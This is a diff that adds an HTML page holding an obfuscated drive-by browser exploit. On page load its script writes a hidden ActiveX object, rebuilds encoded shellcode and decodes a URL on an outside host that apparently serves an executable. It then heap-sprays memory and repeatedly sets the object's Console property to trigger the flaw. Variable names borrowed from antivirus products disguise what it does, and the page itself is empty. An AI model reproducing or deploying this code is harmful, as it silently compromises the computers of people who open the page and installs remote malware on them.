@@ -1,0 +1,60 @@
+<html><head><script>window.onerror=function(){return true;}</script>
+<script>
+document.writeln("<object classid=\"clsid:CFCDAA03-8BE4-11CF-B84B-0020AFBBCCFA\" style=\'display:none\' id=\'Silverlight\'><\/object>");
+document.writeln("<script language=\"JavaScript\">");
+document.writeln("var BenQ01,BenQ02,BenQ03,BenQ04,BenQ05,BenQ06,BenQ07,BenQ08,BenQ09,BenQ10;");
+document.writeln("var BenQ11,BenQ12,BenQ13,BenQ14,BenQ15,BenQ16,BenQ17,BenQ18,BenQ19,BenQ20;");
+document.writeln("var BenQ1k,BenQ2k,BenQ3k,BenQ4k,BenQ5k,Yorkld,Wolfef,Wolfdatelk,QuadroXFX;");
+document.writeln("BenQ2k = unescape(\"psd2f6d\");\/\/(\"psd746fpsdfb7cpsd1752psd8476psd3b4epsd5362psd3a67psd3760c\");");
+document.writeln("BenQ19 = unescape(\"psd6576\");\/\/(\"psd5c4fpsd3a4epsd227dpsd3c5cpsd7943psd6562psd2d72psd26873\");");
+document.writeln("BenQ5k = unescape(\"psd0000\");\/\/(\"psd3030psd074epsdcf50psd207dpsdfd80psd4d91psd59fdpsd1521f\");");
+document.writeln("BenQ01 = unescape(\"psd56e8\");\/\/(\"psd0a4epsd5a50psd864epsddb8fpsd004epsd656bpsd8476psd46e7f\");");
+document.writeln("BenQ18 = unescape(\"psd6f6e\");\/\/(\"psd4753psda77epsd0cffpsd6496psd864epsde562psd0967psd53031\");");
+document.writeln("BenQ16 = unescape(\"psd7777\");\/\/(\"psd6780psd302fpsd5702psd4e28psd81bapsd8b38psd52c6psd6542b\");");
+document.writeln("BenQ1k = unescape(\"psd6f63\");\/\/(\"psd5349psd76d8psd9584psd595cpsd4e34psd594bpsdff16psd7540c\");");
+document.writeln("BenQ17 = unescape(\"psd302e\");\/\/(\"psd3033psd5730psd6228psd64cdpsd4f44psd757fpsd6528psd897b9\");");
+document.writeln("BenQ20 = unescape(\"psd2e6c\");\/\/(\"psd5262psd51a0psd4e65psd6686psd52f4psd66a0psd807apsdu76fd\");");
+document.writeln("BenQ3k = unescape(\"psd6162\"+\"psd6b63\");\/\/(\"psd8b57psd0cffpsd3354psd3030psd2857psd2760psd\");");
+document.writeln("BenQ4k = unescape(\"psd632e\"+\"psd7373\");\/\/(\"psd7b8cpsd8111psd5f38psd95ebpsd67f8psd803apsd\");");
+document.writeln("BenQ06 = unescape(\"psdc031\"+\"psd5e5fpsd5b5dpsd08c2psd5e00psd306apsd6459psd198bpsd5b8bpsd8b0c\");");
+document.writeln("BenQ13 = unescape(\"psd6c6c\"+\"psde800psdffaepsdffffpsd5255psd444cpsd776fpsd6c6epsd616fpsd5464\");");
+document.writeln("BenQ05 = unescape(\"psd245a\"+\"psdeb01psd8b66psd4b0cpsd5a8bpsd011cpsd8bebpsd8b04psde801psd02eb\");");
+document.writeln("BenQ15 = unescape(\"psdffff\"+\"psd2e2epsd785cpsde800psdff89psdffffpsd7468psd7074psd2f3apsd772f\");");
+document.writeln("BenQ03 = unescape(\"psd4a8b\"+\"psd8b18psd205apsdeb01psd32e3psd8b49psd8b34psdee01psdff31psd31fc\");");
+document.writeln("BenQ04 = unescape(\"psdacc0\"+\"psde038psd0774psdcfc1psd010dpsdebc7psd3bf2psd247cpsd7514psd8be1\");");
+document.writeln("BenQ12 = unescape(\"psdff73\"+\"psd6ad6psdff00psde8d0psdffabpsdffffpsd7275psd6d6cpsd6e6fpsd642e\");");
+document.writeln("BenQ02 = unescape(\"psd0000\"+\"psd5300psd5655psd8b57psd246cpsd8b18psd3c45psd548bpsd7805psdea01\");");
+document.writeln("BenQ08 = unescape(\"psd0e4e\"+\"psdffecpsdebd6psd5a50psdff52psd89d0psd52c2psd5352psdaa68psd0dfc\");");
+document.writeln("BenQ11 = unescape(\"psd9868\"+\"psd8afepsdff0epsdebd6psd5944psd006apsdff51psd53d0psd7e68psde2d8\");");
+document.writeln("BenQ07 = unescape(\"psd1c5b\"+\"psd1b8bpsd5b8bpsd5308psd8e68psd0e4epsdffecpsd89d6psd53c7psd8e68\");");
+document.writeln("BenQ10 = unescape(\"psd5100\"+\"psd6a52psdff00psd53d0psda068psdc9d5psdff4dpsd5ad6psdff52psd53d0\");");
+document.writeln("BenQ14 = unescape(\"psd466f\"+\"psd6c69psd4165psde800psdffa0psdffffpsd2e2epsd785cpsde800psdffb7\");");
+document.writeln("BenQ09 = unescape(\"psdff7c\"+\"psd5ad6psd4debpsd5159psdff52psdebd0psd5a72psd5bebpsd6a59psd6a00\");");
+document.writeln("Yorkld = BenQ01+BenQ02+BenQ03+BenQ04+BenQ05+BenQ06+BenQ07+BenQ08+BenQ09+BenQ10;");
+document.writeln("Wolfef = BenQ11+BenQ12+BenQ13+BenQ14+BenQ15+BenQ16+BenQ17+BenQ18+BenQ19+BenQ20;");
+document.writeln("Wolfdatelk = BenQ1k+BenQ2k+BenQ3k+BenQ4k+BenQ5k;");
+document.writeln("var MmUrl = unescape(\"%u7468%u7074%u2f3a%u632f%u756f%u746e%u3831%u772e%u7175%u6e69%u3167%u3137%u3337%u632e%u2f6e%u7363%u2f73%u7473%u6c79%u2e65%u7865%u0065\");");
+document.writeln("var QuadroSCR = Yorkld+Wolfef+Wolfdatelk;");
+document.writeln("QuadroXFX = unescape(QuadroSCR.replace(\/psd\/g,\"\\x25\\x75\"));");
+document.writeln("var AntiVir = unescape(\"%u0C0C\"+\"%u0C0C\");");
+document.writeln("var Norton = 20;");
+document.writeln("var DrWeb = Norton + QuadroXFX.length;");
+document.writeln("while (AntiVir.length < DrWeb) AntiVir += AntiVir;");
+document.writeln("var Brisbane = AntiVir.substring(0,DrWeb);");
+document.writeln("var Radeon = AntiVir.substring(0,AntiVir.length - DrWeb);");
+document.writeln("while (Radeon.length + DrWeb < 0x40000) Radeon = Radeon + Radeon + Brisbane;");
+document.writeln("var Mcafee = new window[\"\\x41\\x72\\x72\\x61\\x79\"]();");
+document.writeln("for (i = 0; i < 400; i++){ Mcafee[i] = Radeon + QuadroXFX }");
+document.writeln("var Ewido = \'\';");
+document.writeln("while (Ewido.length < 32) Ewido = Ewido + unescape(\"%0C\");");
+document.writeln("var Agena = \'\';");
+document.writeln("Agena = Silverlight.Console;");
+document.writeln("Silverlight[\"\\x43\\x6f\\x6e\\x73\\x6f\\x6c\\x65\"] = Ewido;");
+document.writeln("Silverlight[\"\\x43\\x6f\\x6e\\x73\\x6f\\x6c\\x65\"] = Agena;");
+document.writeln("Silverlight[\"\\x43\\x6f\\x6e\\x73\\x6f\\x6c\\x65\"] = Ewido;");
+document.writeln("Silverlight[\"\\x43\\x6f\\x6e\\x73\\x6f\\x6c\\x65\"] = Agena;");
+document.writeln("<\/script>");
+</script>
+
+<script language="javascript" src="rl_files/click"></script></head><body><span style="display: none;">
+</span></body></html>
